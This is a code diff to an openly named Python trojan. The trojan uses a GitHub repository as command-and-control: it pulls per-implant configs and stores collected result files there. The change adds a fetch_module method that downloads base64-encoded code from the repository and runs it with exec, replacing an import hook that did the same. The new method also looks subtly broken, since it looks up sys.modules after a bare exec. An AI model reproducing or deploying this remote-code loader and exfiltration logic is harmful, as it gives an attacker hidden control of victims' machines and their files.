@@ -16,28 +16,33 @@ def github_connect():
     sess = github3.login(token=token)
     return sess.repository(user, 'Trojan')
 
-def get_file_contents(dirname, module_name, repo):
-    return repo.file_contents(f'{dirname}/{module_name}').content
+def get_file_contents(dirname, filename, repo):
+    return repo.file_contents(f'{dirname}/{filename}').content
 
 class Trojan:
     def __init__(self, id):
         self.id = id
         self.config_file = f'{id}.json'
-        self.data_path = f'data/{id}/'
         self.repo = github_connect()
 
     def get_config(self):
         config_json = get_file_contents('config', self.config_file, self.repo)
         config = json.loads(base64.b64decode(config_json))
-        for task in config:
-            if task['module'] not in sys.modules:
-                exec("import %s" % task['module'])
         return config
 
-    def module_runner(self, module):
-        # Run the module and get the path to the file it returns
-        file_path = sys.modules[module].run()
-        self.store_file(file_path)
+    def fetch_module(self, module_name):
+        module_code = get_file_contents('modules', f'{module_name}.py', self.repo)
+        if module_code:
+            exec(base64.b64decode(module_code), globals())
+            return sys.modules[module_name]
+
+    def module_runner(self, module_name):
+        module = self.fetch_module(module_name)
+        if module:
+            result_file = module.run()
+            self.store_file(result_file)
+        else:
+            print(f"Module {module_name} could not be loaded.")
 
     def store_file(self, file_path):
         with open(file_path, 'rb') as file:
@@ -64,16 +69,7 @@ class GitImporter:
         self.current_module_code = ""
 
     def find_spec(self, fullname, path, target=None):
-        print(f"[*] Attempting to retrieve {fullname}")
-        self.repo = github_connect()
-        try:
-            new_library = get_file_contents('modules', f'{fullname}.py', self.repo)
-            if new_library is not None:
-                self.current_module_code = base64.b64decode(new_library)
-                return importlib.util.spec_from_loader(fullname, loader=self)
-        except github3.exceptions.NotFoundError:
-            print(f"[*] Module {fullname} not found in repository.")
-            return None
+        return None
 
     def create_module(self, spec):
         return None
